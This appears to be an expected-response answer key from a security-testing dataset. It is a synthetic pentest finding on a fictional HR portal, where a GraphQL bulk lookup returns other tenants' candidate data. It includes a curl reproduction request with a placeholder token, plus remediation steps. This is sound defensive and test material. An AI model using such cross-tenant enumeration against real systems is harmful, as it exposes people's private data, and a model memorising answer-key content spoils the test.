# Expected Response

## System
- Domain: HR Tech / Talent Acquisition
- System: JobCore Candidate Portal
- Example ID: GQL-0109

## Priority Findings

### Finding 1: HR Tech — Bulk Candidate Lookup Escalates Own Session Scope (Pattern 10.2)
**Severity:** High
**Category:** Single-User / Parameter Escalation / Own Session Scope Extension

**Summary:**
Per §4.0 RISK-GQL-109 and §5.0 (Pattern 10.2 — parameter escalation): The `bulkCandidateLookup` resolver accepts an arbitrary array of `candidateId` values without verifying that each ID belongs to the caller's tenant. An attacker from `tenant-06ed` queried `bulkCandidateLookup(ids: ["C-2109", "C-1109", "C-3109"])` and received candidate PII belonging to `tenant-f473`, including `CONFIDENTIAL-06edf473`. In HR Tech, this exposes confidential candidate profiles, interview feedback, and compensation data.

**Evidence from HAR:**
- Request: `POST https://api.jobcore-candidate-po.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-06ed`
- Query: `bulkCandidateLookup(ids: ["C-2109", "C-1109", "C-3109"]) { candidateId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-f473"`, `ownerId: "other-user-06edf473"`, `sensitiveField: "CONFIDENTIAL-06edf473"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-06edf473`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-109 | bulkCandidateLookup accepts arbitrary IDs |
| HAR request | ids array | C-2109, C-1109, C-3109 (cross-tenant IDs) |
| HAR response | tenantId | tenant-f473 returned for tenant-06ed caller |
| HAR response | sensitiveField | CONFIDENTIAL-06edf473 |

## Steps to Reproduce

### Step 1 — Bulk candidate lookup with cross-tenant IDs (HAR)
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-06ed" \
  -d '{"query": "query { bulkCandidateLookup(ids: [\"C-2109\", \"C-1109\", \"C-3109\"]) { candidateId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Cross-tenant candidate PII returned. **Secure:** Only `tenant-06ed` candidates returned or FORBIDDEN.

## Remediation
1. Filter bulk lookup results server-side: `WHERE candidate_id = ANY($ids) AND tenant_id = $jwt.tenantId`.
2. Limit bulk lookup array size to prevent enumeration.
3. Redis cache key: `candidate:{tenantId}:{candidateId}`.
